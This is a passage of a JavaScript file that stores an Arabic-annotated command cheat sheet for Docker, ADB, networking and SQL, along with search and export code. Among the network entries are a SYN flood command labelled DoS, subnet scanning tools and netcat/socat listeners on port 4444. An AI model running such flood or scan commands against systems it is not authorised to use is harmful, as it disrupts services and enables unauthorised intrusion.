docker tag img newtag###وسم###صور###Docker
docker login###تسجيل###Registry###Docker
docker login -u user###بمستخدم###Registry###Docker
docker logout###خروج###Registry###Docker
docker search image###بحث###Registry###Docker
docker compose up -d###تشغيل###Compose###Docker
docker compose down###إيقاف###Compose###Docker
docker compose ps###حالة###Compose###Docker
docker compose logs -f###سجلات###Compose###Docker
docker compose restart###إعادة###Compose###Docker
docker compose build###بناء###Compose###Docker
docker compose pull###سحب###Compose###Docker
docker compose exec service bash###دخول###Compose###Docker
docker network ls###الشبكات###شبكات###Docker
docker network create net###إنشاء###شبكات###Docker
docker network rm net###حذف###شبكات###Docker
docker network inspect net###تفاصيل###شبكات###Docker
docker network connect net cont###اتصال###شبكات###Docker
docker network disconnect net cont###قطع###شبكات###Docker
docker volume ls###الأحجام###أحجام###Docker
docker volume create vol###إنشاء###أحجام###Docker
docker volume rm vol###حذف###أحجام###Docker
docker volume inspect vol###تفاصيل###أحجام###Docker
docker volume prune###تنظيف###أحجام###Docker
docker system prune###تنظيف###تنظيف###Docker
docker system prune -a###تنظيف كامل###تنظيف###Docker
docker system prune -a --volumes###مع أحجام###تنظيف###Docker
docker system df###استخدام###مراقبة###Docker
docker system events###أحداث###مراقبة###Docker
`,

    /* ==================== ADB ==================== */
    adb: `
adb devices###الأجهزة###أساسيات###ADB
adb devices -l###تفاصيل###أساسيات###ADB
adb start-server###بدء###أساسيات###ADB
adb kill-server###إيقاف###أساسيات###ADB
adb version###الإصدار###أساسيات###ADB
adb shell###دخول###shell###ADB
adb shell ls###قائمة###shell###ADB
adb shell pwd###المسار###shell###ADB
adb shell cd path###تغيير###shell###ADB
adb shell cat file###قراءة###shell###ADB
adb shell ps###العمليات###shell###ADB
adb install app.apk###تثبيت###تطبيقات###ADB
adb install -r app.apk###إعادة###تطبيقات###ADB
adb install -d app.apk###السماح بالتراجع###تطبيقات###ADB
adb install -g app.apk###مع كل الصلاحيات###تطبيقات###ADB
adb uninstall com.pkg###إزالة###تطبيقات###ADB
adb uninstall -k com.pkg###مع البيانات###تطبيقات###ADB
adb push file /sdcard/###دفع###ملفات###ADB
adb push -p file /sdcard/###مع تفاصيل###ملفات###ADB
adb pull /sdcard/file ./###سحب###ملفات###ADB
adb pull -a /sdcard/ ./###كل###ملفات###ADB
adb logcat###سجلات###سجلات###ADB
adb logcat -v time###بالوقت###سجلات###ADB
adb logcat -v color###ملون###سجلات###ADB
adb logcat -c###تنظيف###سجلات###ADB
adb logcat *:E###أخطاء###سجلات###ADB
adb logcat -s TAG###فلتر###سجلات###ADB
adb logcat > log.txt###حفظ###سجلات###ADB
adb reboot###إعادة###نظام###ADB
adb reboot recovery###Recovery###نظام###ADB
adb reboot bootloader###Fastboot###نظام###ADB
adb reboot download###Download###نظام###ADB
adb shell pm list packages###الحزم###حزم###ADB
adb shell pm list packages -3###طرف ثالث###حزم###ADB
adb shell pm list packages -s###نظام###حزم###ADB
adb shell pm list packages -d###معطلة###حزم###ADB
adb shell pm list packages -e###مفعلة###حزم###ADB
adb shell pm list packages | grep x###بحث###حزم###ADB
adb shell pm path com.pkg###مسار###حزم###ADB
adb shell pm uninstall -k --user 0 pkg###إلغاء###حزم###ADB
adb shell pm enable pkg###تفعيل###حزم###ADB
adb shell pm disable-user pkg###تعطيل###حزم###ADB
adb shell pm clear pkg###مسح بيانات###حزم###ADB
adb shell am start -n pkg/activity###تشغيل###تطبيقات###ADB
adb shell am start -a android.intent.action.VIEW -d URL###فتح URL###تطبيقات###ADB
adb shell am force-stop pkg###إيقاف###تطبيقات###ADB
adb shell am broadcast###بث###تطبيقات###ADB
adb shell dumpsys battery###البطارية###معلومات###ADB
adb shell dumpsys wifi###WiFi###معلومات###ADB
adb shell dumpsys activity###أنشطة###معلومات###ADB
adb shell dumpsys meminfo###ذاكرة###معلومات###ADB
adb shell dumpsys package pkg###تفاصيل حزمة###معلومات###ADB
adb shell settings list global###إعدادات###معلومات###ADB
adb shell settings list system###نظام###معلومات###ADB
adb shell settings get global adb_enabled###قيمة###معلومات###ADB
adb shell settings put global airplan_mode_on 1###تعديل###معلومات###ADB
adb shell getprop###خصائص###معلومات###ADB
adb shell getprop ro.build.version.release###إصدار أندرويد###معلومات###ADB
adb shell getprop ro.product.model###طراز###معلومات###ADB
adb shell getprop ro.product.brand###علامة###معلومات###ADB
adb shell getprop ro.serialno###تسلسلي###معلومات###ADB
adb shell screencap -p /sdcard/s.png###لقطة###وسائط###ADB
adb shell screencap -p /sdcard/s.png && adb pull /sdcard/s.png###لقطة+سحب###وسائط###ADB
adb shell screenrecord /sdcard/v.mp4###تسجيل###وسائط###ADB
adb shell screenrecord --time-limit 30 /sdcard/v.mp4###30 ثانية###وسائط###ADB
adb shell input tap 500 500###لمس###تحكم###ADB
adb shell input swipe 100 100 500 500###سحب###تحكم###ADB
adb shell input swipe 500 1000 500 100###تمرير###تحكم###ADB
adb shell input text 'hello'###نص###تحكم###ADB
adb shell input keyevent 26###طاقة###تحكم###ADB
adb shell input keyevent 3###رئيسية###تحكم###ADB
adb shell input keyevent 4###رجوع###تحكم###ADB
adb shell input keyevent 82###قائمة###تحكم###ADB
adb shell wm size###حجم###معلومات###ADB
adb shell wm density###كثافة###معلومات###ADB
adb shell wm size 1080x1920###تغيير###تحكم###ADB
adb shell svc power stayon true###منع النوم###تحكم###ADB
adb shell svc wifi enable###تفعيل WiFi###تحكم###ADB
adb shell svc data enable###تفعيل بيانات###تحكم###ADB
adb backup -apk -all -f backup.ab###نسخة###نسخ###ADB
adb backup -apk -shared -all###مع shared###نسخ###ADB
adb restore backup.ab###استعادة###نسخ###ADB
adb shell su -c 'cmd'###root###root###ADB
adb root###root adbd###root###ADB
adb unroot###إلغاء root###root###ADB
adb remount###rw /system###root###ADB
adb tcpip 5555###TCP###شبكات###ADB
adb connect 192.168.1.5:5555###اتصال###شبكات###ADB
adb disconnect###قطع###شبكات###ADB
adb forward tcp:8080 tcp:80###forward###شبكات###ADB
adb reverse tcp:8080 tcp:80###reverse###شبكات###ADB
adb sideload file.zip###sideload###فلاش###ADB
adb wait-for-device###انتظار###أساسيات###ADB
`,

    /* ==================== NETWORK ==================== */
    network: `
ifconfig###الواجهات###أساسيات###Network
ifconfig eth0###واجهة محددة###أساسيات###Network
iwconfig###لاسلكي###أساسيات###Network
ip a###عناوين###أساسيات###Network
ip -4 a###IPv4 فقط###أساسيات###Network
ip -6 a###IPv6 فقط###أساسيات###Network
ip link###الروابط###أساسيات###Network
ip link set eth0 up###تفعيل###إدارة###Network
ip link set eth0 down###إيقاف###إدارة###Network
ifconfig eth0 down###إيقاف###إدارة###Network
ifconfig eth0 up###تفعيل###إدارة###Network
route -n###التوجيه###توجيه###Network
ip r###التوجيه###توجيه###Network
ip route add default via 192.168.1.1###بوابة###توجيه###Network
ip route del default###حذف###توجيه###Network
arp -a###جدول ARP###ARP###Network
arp -n###بدون DNS###ARP###Network
arping -I eth0 192.168.1.1###ARP ping###ARP###Network
arp-scan --localnet###مسح ARP###ARP###Network
arp-scan -I eth0 192.168.1.0/24###واجهة محددة###ARP###Network
netdiscover -r 192.168.1.0/24###اكتشاف###اكتشاف###Network
netdiscover -p###سلبي###اكتشاف###Network
fping -a -g 192.168.1.0/24###ping سريع###اكتشاف###Network
fping -a -g 192.168.1.1 192.168.1.254###نطاق###اكتشاف###Network
masscan -p1-1000 192.168.1.0/24###سريع###فحص###Network
masscan -p80,443 192.168.1.0/24 --rate 1000###منافذ محددة###فحص###Network
nmap -sP 192.168.1.0/24###اكتشاف###فحص###Network
nmap -sn 192.168.1.0/24###بدون منافذ###فحص###Network
hping3 -S target -p 80###SYN###فحص###Network
hping3 -S --flood target###flood###DoS###Network
hping3 --icmp target###ICMP###فحص###Network
tcpdump -i eth0###التقاط###تحليل###Network
tcpdump -i eth0 -w cap.pcap###حفظ###تحليل###Network
tcpdump -i eth0 port 443###منفذ###تحليل###Network
tcpdump -i eth0 -A###ASCII###تحليل###Network
tcpdump -i eth0 -X###hex###تحليل###Network
tcpdump -i eth0 -nn###بدون DNS###تحليل###Network
tcpdump -i eth0 'tcp[13] & 2 != 0'###SYN###تحليل###Network
tshark -i eth0###طرفية###تحليل###Network
tshark -i eth0 -w cap.pcap###حفظ###تحليل###Network
tshark -r cap.pcap###قراءة###تحليل###Network
tshark -r cap.pcap -Y 'http.request'###فلترة###تحليل###Network
tshark -r cap.pcap -T fields -e ip.src -e ip.dst###حقول###تحليل###Network
nethogs###استخدام###مراقبة###Network
iftop -i eth0###مباشر###مراقبة###Network
bmon###نطاق###مراقبة###Network
nload###حمل###مراقبة###Network
vnstat###إحصائيات###مراقبة###Network
speedtest-cli###سرعة###اختبار###Network
speedtest-cli --list###سيرفرات###اختبار###Network
iperf -s###خادم iperf###اختبار###Network
iperf -c server###عميل iperf###اختبار###Network
curl -I URL###ترويسات###HTTP###Network
curl -X GET URL###GET###HTTP###Network
curl -X POST -d data URL###POST###HTTP###Network
curl -X PUT -d data URL###PUT###HTTP###Network
curl -X DELETE URL###DELETE###HTTP###Network
curl -H 'Auth: Bearer token' URL###ترويسة###HTTP###Network
curl -H 'User-Agent: x' URL###UA###HTTP###Network
curl --cookie 'k=v' URL###cookies###HTTP###Network
curl -O URL###تحميل###HTTP###Network
curl -o file URL###باسم###HTTP###Network
curl -L URL###redirects###HTTP###Network
curl -k URL###تجاهل SSL###HTTP###Network
curl -u user:pass URL###مصادقة###HTTP###Network
curl --data @file.json URL###من ملف###HTTP###Network
curl --proxy http://proxy:8080 URL###proxy###HTTP###Network
wget URL###تحميل###تحميل###Network
wget -c URL###استكمال###تحميل###Network
wget -O file URL###باسم###تحميل###Network
wget -r -np URL###موقع كامل###تحميل###Network
wget --mirror URL###مرآة###تحميل###Network
wget --spider URL###فحص###تحميل###Network
nc -l 4444###استماع###netcat###Network
nc -lvnp 4444###استماع###netcat###Network
nc 192.168.1.1 80###اتصال###netcat###Network
nc -zv host 1-100###فحص###netcat###Network
nc -zv host 20-30###نطاق###netcat###Network
nc -u host 53###UDP###netcat###Network
socat TCP-LISTEN:4444 -###بديل###netcat###Network
socat - TCP:host:80###اتصال###netcat###Network
socat TCP-LISTEN:4444,fork###fork###netcat###Network
`,

    /* ==================== SQL ==================== */
    sql: `
SELECT * FROM users;###الكل###SELECT###SQL
SELECT name,email FROM users;###أعمدة###SELECT###SQL
SELECT * FROM users WHERE id=1;###شرط###WHERE###SQL
SELECT * FROM users WHERE age>18;###أكبر من###WHERE###SQL
SELECT * FROM users WHERE name LIKE 'A%';###نمط###LIKE###SQL
SELECT * FROM users WHERE id IN (1,2,3);###IN###IN###SQL
SELECT * FROM users WHERE id BETWEEN 1 AND 10;###مدى###BETWEEN###SQL
SELECT * FROM users WHERE email IS NULL;###NULL###NULL###SQL
SELECT * FROM users WHERE email IS NOT NULL;###ليس NULL###NULL###SQL
SELECT * FROM users ORDER BY id DESC;###ترتيب###ORDER###SQL
SELECT * FROM users ORDER BY name ASC;###تصاعدي###ORDER###SQL
SELECT * FROM users ORDER BY id DESC LIMIT 10;###تحديد###LIMIT###SQL
SELECT * FROM users LIMIT 10 OFFSET 20;###تخطي###LIMIT###SQL
SELECT COUNT(*) FROM users;###عد###Aggregate###SQL
SELECT SUM(salary) FROM users;###مجموع###Aggregate###SQL
SELECT AVG(salary) FROM users;###متوسط###Aggregate###SQL
SELECT MIN(id),MAX(id) FROM users;###min/max###Aggregate###SQL
SELECT DISTINCT city FROM users;###فريد###SELECT###SQL
SELECT city,COUNT(*) FROM users GROUP BY city;###تجميع###GROUP###SQL
SELECT city,COUNT(*) FROM users GROUP BY city HAVING COUNT(*)>5;###HAVING###GROUP###SQL
INSERT INTO users (name) VALUES ('Ali');###إدراج###INSERT###SQL
INSERT INTO users VALUES (1,'A','a@x.com');###كامل###INSERT###SQL
INSERT INTO users (name,email) VALUES ('A','a@x'),('B','b@x');###متعدد###INSERT###SQL
UPDATE users SET name='H' WHERE id=1;###تحديث###UPDATE###SQL
UPDATE users SET salary=salary*1.1;###حسابي###UPDATE###SQL
DELETE FROM users WHERE id=1;###حذف###DELETE###SQL
DELETE FROM users WHERE id IN (1,2,3);###متعدد###DELETE###SQL
SELECT * FROM users u JOIN orders o ON u.id=o.user_id;###جمع###JOIN###SQL
SELECT * FROM users LEFT JOIN orders ON users.id=orders.user_id;###LEFT###JOIN###SQL
SELECT * FROM users RIGHT JOIN orders ON users.id=orders.user_id;###RIGHT###JOIN###SQL
SELECT * FROM users INNER JOIN orders ON users.id=orders.user_id;###INNER###JOIN###SQL
SELECT * FROM users FULL OUTER JOIN orders;###FULL###JOIN###SQL
SELECT * FROM users UNION SELECT * FROM admins;###UNION###Set###SQL
SELECT * FROM users UNION ALL SELECT * FROM admins;###UNION ALL###Set###SQL
SELECT * FROM users INTERSECT SELECT * FROM admins;###تقاطع###Set###SQL
SELECT * FROM users EXCEPT SELECT * FROM admins;###فرق###Set###SQL
CREATE DATABASE mydb;###إنشاء قاعدة###DDL###SQL
DROP DATABASE mydb;###حذف قاعدة###DDL###SQL
USE mydb;###اختيار###DDL###SQL
CREATE TABLE users (id INT PRIMARY KEY,name VARCHAR(50));###جدول###DDL###SQL
CREATE TABLE users (id INT AUTO_INCREMENT PRIMARY KEY);###AUTO_INCREMENT###DDL###SQL
ALTER TABLE users ADD email VARCHAR(100);###عمود###DDL###SQL
ALTER TABLE users DROP COLUMN email;###حذف عمود###DDL###SQL
ALTER TABLE users MODIFY name VARCHAR(100);###تعديل###DDL###SQL
ALTER TABLE users RENAME TO clients;###تسمية###DDL###SQL
DROP TABLE users;###حذف جدول###DDL###SQL
TRUNCATE TABLE users;###تفريغ###DDL###SQL
CREATE INDEX idx_name ON users(name);###فهرس###DDL###SQL
DROP INDEX idx_name;###حذف فهرس###DDL###SQL
CREATE UNIQUE INDEX idx_email ON users(email);###فريد###DDL###SQL
CREATE VIEW v_users AS SELECT * FROM users;###عرض###DDL###SQL
DROP VIEW v_users;###حذف عرض###DDL###SQL
GRANT SELECT ON db.* TO 'user'@'host';###منح###DCL###SQL
REVOKE SELECT ON db.* FROM 'user'@'host';###سحب###DCL###SQL
GRANT ALL ON db.* TO 'user'@'host';###الكل###DCL###SQL
SHOW DATABASES;###قواعد###Admin###SQL
SHOW TABLES;###جداول###Admin###SQL
DESCRIBE users;###هيكل###Admin###SQL
SHOW CREATE TABLE users;###إنشاء###Admin###SQL
SHOW INDEX FROM users;###فهارس###Admin###SQL
SHOW PROCESSLIST;###عمليات###Admin###SQL
EXPLAIN SELECT * FROM users;###تحليل###Admin###SQL
EXPLAIN ANALYZE SELECT * FROM users;###تنفيذي###Admin###SQL
BEGIN;###بدء###TCL###SQL
COMMIT;###تثبيت###TCL###SQL
ROLLBACK;###تراجع###TCL###SQL
SAVEPOINT sp1;###نقطة حفظ###TCL###SQL
`
  };

  /* ============================================================
     PARSER
     ============================================================ */
  function parseCategory(raw) {
    const lines = raw.trim().split('\n');
    const result = [];
    lines.forEach((line, i) => {
      const trimmed = line.trim();
      if (!trimmed) return;
      const parts = trimmed.split('###');
      if (parts.length >= 4) {
        result.push({
          id: i,
          cmd: parts[0].trim(),
          desc: parts[1].trim(),
          sub: parts[2].trim(),
          platform: parts[3].trim()
        });
      }
    });
    return result;
  }

  // Build parsed data
  const PARSED = {};
  Object.keys(RAW_DATA).forEach((cat) => {
    PARSED[cat] = parseCategory(RAW_DATA[cat]);
  });

  // Flat list of all commands
  const ALL_COMMANDS = [];
  Object.keys(PARSED).forEach((cat) => {
    PARSED[cat].forEach((c) => {
      ALL_COMMANDS.push(Object.assign({}, c, { category: cat }));
    });
  });

  /* ============================================================
     CATEGORY METADATA
     ============================================================ */
  const CATEGORIES = [
    { key: 'linux',      name: 'Linux',       icon: '🐧', color: 'green'  },
    { key: 'termux',     name: 'Termux',      icon: '📱', color: 'cyan'   },
    { key: 'kali',       name: 'Kali Linux',  icon: '🐉', color: 'purple' },
    { key: 'windows',    name: 'Windows',     icon: '🪟', color: 'cyan'   },
    { key: 'powershell', name: 'PowerShell',  icon: '⚡', color: 'blue'   },
    { key: 'python',     name: 'Python',      icon: '🐍', color: 'yellow' },
    { key: 'git',        name: 'Git',         icon: '📦', color: 'orange' },
    { key: 'docker',     name: 'Docker',      icon: '🐳', color: 'cyan'   },
    { key: 'adb',        name: 'ADB',         icon: '📲', color: 'green'  },
    { key: 'network',    name: 'Network',     icon: '📡', color: 'purple' },
    { key: 'sql',        name: 'SQL',         icon: '🗄️', color: 'yellow' }
  ];

  /* ============================================================
     SEARCH & FILTER FUNCTIONS
     ============================================================ */
  function searchCommands(query, category) {
    const q = (query || '').toLowerCase().trim();
    const cat = category || 'all';
    return ALL_COMMANDS.filter((c) => {
      const matchCat = cat === 'all' || c.category === cat;
      if (!q) return matchCat;
      const matchQuery =
        c.cmd.toLowerCase().includes(q) ||
        c.desc.includes(query) ||
        c.desc.toLowerCase().includes(q) ||
        c.sub.toLowerCase().includes(q) ||
        c.platform.toLowerCase().includes(q);
      return matchCat && matchQuery;
    });
  }

  function getCategoryCount(key) {
    return PARSED[key] ? PARSED[key].length : 0;
  }

  /* ============================================================
     FILE CONTENT GENERATOR
     ============================================================ */
  function generateCategoryFile(key) {
    if (!PARSED[key]) return null;
    const cat = CATEGORIES.find((c) => c.key === key);
    const commands = PARSED[key];
    const date = new Date().toISOString().split('T')[0];

    let content = '';
    content += '='.repeat(60) + '\n';
    content += '  SECRET BOX — ' + (cat ? cat.name.toUpperCase() : key.toUpperCase()) + '\n';
    content += '  المطور: أحمد علي (السيد الأسود)\n';
    content += '  التاريخ: ' + date + '\n';
    content += '  عدد الأوامر: ' + commands.length + '\n';
    content += '='.repeat(60) + '\n\n';

    let lastSub = '';
    commands.forEach((c, i) => {
      if (c.sub !== lastSub) {
        content += '\n' + '━'.repeat(50) + '\n';
        content += '  ' + c.sub + '\n';
        content += '━'.repeat(50) + '\n\n';
        lastSub = c.sub;
      }
      content += '[' + (i + 1) + '] ' + c.cmd + '\n';
      content += '    💡 ' + c.desc + '\n';
      content += '    🏷️  ' + c.platform + '\n\n';
    });

    content += '\n' + '='.repeat(60) + '\n';
    content += '🎁 أعطيك معلومات مجاناً — لا تبخل عليّ وانشر الموقع ليستفيد غيرك\n';
    content += '='.repeat(60) + '\n';

    return {
      filename: 'SecretBox-' + key + '.txt',
      title: cat ? cat.name : key,
      content: content,
      count: commands.length
    };
  }

  function generateAllCommandsFile() {
    const date = new Date().toISOString().split('T')[0];
    let content = '';
    content += '='.repeat(60) + '\n';
    content += '  SECRET BOX — ALL COMMANDS DATABASE\n';
    content += '  المطور: أحمد علي (السيد الأسود)\n';
    content += '  التاريخ: ' + date + '\n';
    content += '  الإجمالي: ' + ALL_COMMANDS.length + ' أمر\n';
    content += '='.repeat(60) + '\n\n';

    CATEGORIES.forEach((cat) => {
      const commands = PARSED[cat.key];
      if (!commands || !commands.length) return;

      content += '\n\n' + '█'.repeat(60) + '\n';
      content += '█  ' + cat.name.toUpperCase() + ' — ' + commands.length + ' أمر\n';
      content += '█'.repeat(60) + '\n\n';

      let lastSub = '';
      commands.forEach((c, i) => {
        if (c.sub !== lastSub) {
          content += '\n' + '─'.repeat(50) + '\n';
          content += '  ' + c.sub + '\n';
          content += '─'.repeat(50) + '\n\n';
          lastSub = c.sub;
        }
        content += '[' + (i + 1) + '] ' + c.cmd + '\n';
        content += '    💡 ' + c.desc + '\n';
        content += '    🏷️  ' + c.platform + '\n\n';
      });
    });

    content += '\n' + '='.repeat(60) + '\n';
    content += '🎁 أعطيك معلومات مجاناً — لا تبخل عليّ وانشر الموقع ليستفيد غيرك\n';
    content += '='.repeat(60) + '\n';

    return {
      filename: 'SecretBox-All-Commands.txt',
      title: 'All Commands (' + ALL_COMMANDS.length + ')',
      content: content,
      count: ALL_COMMANDS.length
    };
  }

  function generateCategorySummary() {
    let content = '';
    content += '='.repeat(60) + '\n';
    content += '  SECRET BOX — فهرس الأوامر\n';
    content += '  المطور: أحمد علي (السيد الأسود)\n';
    content += '='.repeat(60) + '\n\n';
    content += 'الإجمالي: ' + ALL_COMMANDS.length + ' أمر\n\n';

    CATEGORIES.forEach((cat) => {
      content += '• ' + cat.name.padEnd(15) + ' : ' + getCategoryCount(cat.key) + ' أمر\n';
    });

    content += '\n' + '='.repeat(60) + '\n';
    content += '🎁 أعطيك معلومات مجاناً — لا تبخل عليّ وانشر الموقع ليستفيد غيرك\n';

    return {
      filename: 'SecretBox-Index.txt',
      title: 'Index',
      content: content
    };
  }

  /* ============================================================
     PUBLIC API
     ============================================================ */
  function getFileContent(key) {
    if (!key) return null;

    // Single category
    if (PARSED[key]) return generateCategoryFile(key);

    // All commands
    if (key === 'all' || key === 'all-commands') {
      return generateAllCommandsFile();
    }

    // Index
    if (key === 'index') return generateCategorySummary();

    // Fallback: empty file
    return {
      filename: 'SecretBox-' + key + '.txt',
      title: key,
      content: 'ملف غير متوفر: ' + key + '\n\n🎁 أعطيك معلومات مجاناً — انشر الموقع ليستفيد غيرك\n'
    };
  }

  /* ============================================================
     RENDER HELPERS
     ============================================================ */
  function renderCommandsToTable(commands, limit) {
    const lim = limit || 600;
    const sliced = commands.slice(0, lim);
    return sliced.map((c) => {
      return '<tr>' +
        '<td><code>' + escapeHtml(c.cmd) + '</code></td>' +
        '<td>' + escapeHtml(c.desc) + '</td>' +
        '<td>' + escapeHtml(c.sub) + '</td>' +
        '<td>' + escapeHtml(c.platform) + '</td>' +
        '</tr>';
    }).join('');
  }

  function renderCategoryChips() {
    let html = '<button class="filter-chip active" data-filter="all">الكل (' + ALL_COMMANDS.length + ')</button>';
    CATEGORIES.forEach((cat) => {
      html += '<button class="filter-chip" data-filter="' + cat.key + '">' +
        cat.name + ' (' + getCategoryCount(cat.key) + ')</button>';
    });
    return html;
  }

  function renderFilterChips() {
    return renderCategoryChips();
  }

  function escapeHtml(str) {
    return String(str)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#39;');
  }

  /* ============================================================
     STATISTICS
     ============================================================ */
  const STATS = {
    total: ALL_COMMANDS.length,
    categories: CATEGORIES.length,
    byCategory: {}
  };
  CATEGORIES.forEach((cat) => {
    STATS.byCategory[cat.key] = getCategoryCount(cat.key);
  });

  /* ============================================================
     EXPORT TO WINDOW
     ============================================================ */
  window.SB_DATA = {
    // Data
    categories: CATEGORIES,
    commands: ALL_COMMANDS,
    raw: PARSED,
    stats: STATS,

    // Methods
    getFileContent: getFileContent,
    search: searchCommands,
    getCategoryCount: getCategoryCount,
    generateCategoryFile: generateCategoryFile,
    generateAllCommandsFile: generateAllCommandsFile,

    // Render helpers
    renderCommandsToTable: renderCommandsToTable,
    renderFilterChips: renderFilterChips,

    // Utilities
    escapeHtml: escapeHtml
  };

  // Also expose commonly-used helpers globally
  window.SB_COMMANDS = ALL_COMMANDS;
  window.SB_CATEGORIES = CATEGORIES;

  /* ============================================================
     CONSOLE BRANDING
     ============================================================ */
  console.log(
    '%c📚 SECRET BOX — Commands Database Loaded',
    'background:linear-gradient(90deg,#00ff9c,#00d9ff);color:#04120b;font-size:14px;font-weight:bold;padding:6px 12px;border-radius:6px'
  );
  console.log(
    '%c✅ ' + ALL_COMMANDS.length + ' أمر في ' + CATEGORIES.length + ' فئة',
    'color:#00ff9c;font-size:13px'
  );
  CATEGORIES.forEach((cat) => {
    console.log(
      '%c   ' + cat.icon + ' ' + cat.name.padEnd(12) + ' ' + getCategoryCount(cat.key) + ' أمر',
      'color:#7d8fa3;font-size:12px'
    );
  });
  console.log(
    '%c🎁 أعطيك معلومات مجاناً — لا تبخل عليّ وانشر الموقع ليستفيد غيرك',
    'color:#ffcc00;font-size:12px;font-weight:bold'
  );

  /* ============================================================
     END OF FILE
     تم التطوير بواسطة: أحمد علي — السيد الأسود 🖤
     ============================================================ */
})();
